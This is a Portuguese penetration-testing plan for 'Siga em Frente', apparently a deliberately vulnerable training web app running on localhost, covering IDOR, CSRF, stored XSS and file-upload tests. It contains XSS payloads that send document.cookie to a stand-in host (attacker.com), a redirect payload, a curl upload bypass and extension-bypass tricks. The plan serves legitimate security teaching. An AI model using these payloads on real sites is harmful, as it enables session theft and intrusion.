# Plano de Teste de Penetração - Siga em Frente

## 1. Escopo e Objetivos

### 1.1 Objetivo Geral

Realizar teste de penetração na aplicação web "Siga em Frente" com foco na identificação, validação e documentação de vulnerabilidades relacionadas a controle de acesso, manipulação de requisições, injeção de código e upload de arquivos.

### 1.2 Escopo da Avaliação

**Sistema Testado:**
- Aplicação web "Siga em Frente"
- Versão: 1.0
- URL: http://localhost:5001

**Componentes In-Scope:**
- Login e autenticação (`/login`)
- Dashboard de operadores (`/dashboard/operator`)
- Dashboard administrativo (`/dashboard/admin`)
- Endpoint de transferência (`/transfer`)
- Endpoint de mensagens (`/message`, `/messages/<id>`)
- Endpoint de upload (`/files`)

**Componentes Out-of-Scope:**
- Infraestrutura do servidor
- Configuração de rede
- Sistema operacional subjacente

### 1.3 Vulnerabilidades Alvo

1. IDOR (Insecure Direct Object References)
2. CSRF (Cross-Site Request Forgery)
3. XSS (Cross-Site Scripting) - Armazenado
4. File Upload Vulnerável

## 2. Metodologia

### 2.1 Fases do Teste

**Fase 1: Reconhecimento e Coleta de Informações**
- Mapear endpoints da aplicação
- Identificar tipos de usuário e funções
- Documentar fluxos de autenticação
- Listar parâmetros de entrada

**Fase 2: Teste de Vulnerabilidades Específicas**
- IDOR: Tentar acessar recursos de outros usuários
- CSRF: Enviar requisições não autorizadas
- XSS: Injetar código JavaScript
- File Upload: Contornar validação de arquivo

**Fase 3: Validação e Exploração**
- Confirmar cada vulnerabilidade encontrada
- Documentar Provas de Conceito (PoC)
- Avaliar impacto potencial

**Fase 4: Documentação**
- Compilar relatório técnico
- Preparar relatório executivo
- Incluir recomendações de mitigação

### 2.2 Ferramentas Utilizadas

**Navegador:**
- Chrome/Firefox Developer Tools
- Burp Suite Community (proxy para interceptação)

**Linha de Comando:**
- curl
- wget

**Automatização:**
- Python 3.x
- Requests library
- Selenium (para testes de XSS)

**Documentação:**
- Markdown/Word
- Screenshot tools

## 3. Plano Detalhado de Testes

### 3.1 Teste de IDOR

**Objetivo:** Validar se operadores podem acessar dados de outros operadores

**Pré-requisitos:**
- Ter credenciais de login para operadores
- Conhecer IDs de múltiplos operadores

**Passos de Teste:**

1. **Login como Operador 1**
   ```
   Usuário: Igor
   Senha: oper1-cab1
   Esperado: Redirecionado para /dashboard/operator?id=1
   ```

2. **Acessar Dashboard de Operador 1**
   - Observar dados displayados (veículos, caixa, mensagens)
   - Registrar screenshot

3. **Tentar Acessar Dashboard de Operador 2**
   - Alterar URL para `/dashboard/operator?id=2`
   - Observar se acesso é concedido
   - Registrar dados visualizados
   - Resultado esperado: Acesso NEGADO (se seguro) ou concedido (se vulnerável)

4. **Repetar para Todos os Operadores**
   - IDs 1-9 (operadores)
   - Documentar quais são acessíveis

5. **Tentar Acessar Dashboard Administrativo**
   - URL: `/dashboard/admin?id=101`
   - Resultado esperado: Acesso NEGADO como operador

**Critério de Sucesso:** Operador pode acessar dados de outros operadores ou dados administrativos

### 3.2 Teste de CSRF

**Objetivo:** Validar se transferências podem ser executadas sem token CSRF

**Pré-requisitos:**
- Credenciais de operador
- Conhecer IDs de cabines
- Browser com JavaScript ativado

**Passos de Teste:**

1. **Preparar Página de Exploit**
   - Criar arquivo `csrf_test.html` com formulário
   - Incluir valores ocultos de montante e cabine destino

2. **Login como Operador**
   ```
   Usuário: Igor
   Senha: oper1-cab1
   ```

3. **Manter Aberta a Aplicação**
   - Não fazer logout
   - Manter sessão ativa em outra aba

4. **Abrir Página de Exploit em Outra Aba**
   - Clicar no botão (executa formulário CSRF)
   - Observar redirecionamento/resultado

5. **Verificar Resultado**
   - Voltar à aplicação original
   - Checar saldo da cabine
   - Observar se transferência foi executada

6. **Análise**
   - Se transferência foi realizada = VULNERÁVEL a CSRF
   - Se transferência foi bloqueada = SEGURO contra CSRF

**Critério de Sucesso:** Transferência realizada sem confirmação ou token CSRF

### 3.3 Teste de XSS Armazenado

**Objetivo:** Validar se mensagens podem armazenar código JavaScript

**Pré-requisitos:**
- Credenciais de administrador
- Credenciais de operador
- Browser com JavaScript ativado

**Passos de Teste:**

1. **Preparar Payload XSS**
   - Simples: `<img src=x onerror="alert('XSS')">`
   - Avançado: `<script>fetch('http://attacker.com/log?cookie=' + document.cookie)</script>`

2. **Login como Administrador**
   ```
   Usuário: mario
   Senha: [gerada durante init_db.py]
   ```

3. **Acessar Dashboard Administrativo**
   - Url: `/dashboard/admin?id=101`

4. **Enviar Mensagem com Payload**
   - Selecionar operador (ex: Igor)
   - Colar payload XSS no campo de mensagem
   - Clique em "Enviar Mensagem"

5. **Fazer Logout**
   - Logout da conta administrativa

6. **Login como Operador Alvo**
   ```
   Usuário: Igor
   Senha: oper1-cab1
   ```

7. **Acessar Dashboard**
   - URL: `/dashboard/operator?id=1`
   - Observar se JavaScript é executado

8. **Análise**
   - Se JavaScript é executado (alert exibido, etc) = VULNERÁVEL a XSS
   - Se código é escapado/não executado = SEGURO contra XSS

**Payloads Adicionais para Testar:**
- Cookie stealing: `<img src=x onerror="fetch('http://attacker.com/log?c=' + document.cookie)">`
- Redirecionamento: `<img src=x onerror="window.location='http://attacker.com'">`
- Alteração de conteúdo: `<script>document.body.innerHTML='HACKED'</script>`

**Critério de Sucesso:** JavaScript é executado no contexto da página

### 3.4 Teste de File Upload

**Objetivo:** Validar se arquivo malicioso pode ser enviado

**Pré-requisitos:**
- Credenciais de administrador
- Ferramenta para criar arquivos
- Acesso ao servidor de arquivos

**Passos de Teste:**

1. **Criar Arquivo de Teste**
   - Criar arquivo Python: `malicious.py`
   - Conteúdo: `print("Code executed")`

2. **Login como Administrador**
   ```
   Usuário: mario
   Senha: [gerada durante init_db.py]
   ```

3. **Acessar Dashboard**
   - URL: `/dashboard/admin?id=101`

4. **Bypass de Validação do Cliente**
   - Usando cURL:
     ```bash
     curl -b "session=<cookie>" -F "file=@malicious.py" http://localhost:5001/files
     ```
   - Ou usar Burp Suite para remover validação

5. **Enviar Arquivo Perigoso**
   - Tentar enviar .exe, .py, .php, .sh
   - Observar se upload é aceito

6. **Verificar Arquivo**
   - Acessar `/uploads/<filename>`
   - Observar se arquivo está acessível
   - Tentar executá-lo (se possível)

7. **Análise**
   - Se arquivo .py/.exe/.php é salvo = VULNERÁVEL a upload
   - Se apenas .docx/.pdf/.eml/.msg são aceitos = SEGURO contra upload

**Variações de Teste:**
- Dupla extensão: `file.php.docx`
- Null byte: `file.php%00.docx`
- Maiúsculas: `file.PHP`
- Sem extensão com magic bytes: arquivo binário com header PDF

**Critério de Sucesso:** Arquivo potencialmente malicioso é salvo no servidor

## 4. Evidências e Documentação

### 4.1 Screenshots Obrigatórios

Para cada vulnerabilidade confirmada, documentar:
- Tela de login com credenciais
- URL modificada mostrando o parâmetro vulnerável
- Dados acessados que não deveriam estar disponíveis
- Resposta do servidor confirmando a vulnerabilidade

### 4.2 Provas de Conceito (PoC)

Incluir para cada vulnerabilidade:
- Código de exploit (curl, Python, etc)
- Arquivo HTML de teste (para CSRF)
- Screenshot de execução
- Output ou resultado final

### 4.3 Logs e Timestamps

- Data e hora de cada teste
- Ferramenta utilizada
- Resultado (sucesso/falha)
- Observações adicionais

## 5. Cronograma de Testes

| Fase | Atividade | Duração | Responsável |
|------|-----------|---------|-------------|
| 1 | Reconhecimento | 1 hora | Pentester |
| 2 | Teste IDOR | 1,5 horas | Pentester |
| 2 | Teste CSRF | 1,5 horas | Pentester |
| 2 | Teste XSS | 1,5 horas | Pentester |
| 2 | Teste File Upload | 1,5 horas | Pentester |
| 3 | Validação | 1 hora | Pentester |
| 4 | Documentação | 2 horas | Pentester |

**Total Estimado:** 10 horas

## 6. Critérios de Aceitação

### 6.1 Vulnerabilidades Confirmadas

Cada vulnerabilidade é considerada confirmada quando:
- ✓ Teste realizado com sucesso
- ✓ Resultado documentado com screenshot/PoC
- ✓ Impacto avaliado
- ✓ Mitigação sugerida

### 6.2 Relatório Finalizado

Relatório está pronto quando:
- ✓ Resumo executivo completo
- ✓ Resumo técnico detalhado
- ✓ Todas as vulnerabilidades documentadas
- ✓ PoCs e screenshots inclusos
- ✓ Recomendações de mitigação provided
- ✓ Assinado e datado

## 7. Contatos e Escalações

| Papel | Nome | Email | Telefone |
|------|------|-------|----------|
| Cliente | AulasHack | contato@aulashack.com | (11) 9999-9999 |
| Pentester Responsável | [Seu Nome] | [Seu Email] | [Seu Telefone] |

## 8. Aprovações

| Papel | Nome | Assinatura | Data |
|------|------|-----------|------|
| Cliente | AulasHack | _____________ | ____/____/____ |
| Pentester | [Seu Nome] | _____________ | ____/____/____ |

---

**Documento preparado por:** AulasHack
**Data:** Janeiro de 2026
**Versão:** 1.0

*Este plano de teste é documento confidencial e deve ser tratado de forma segura e responsável.*
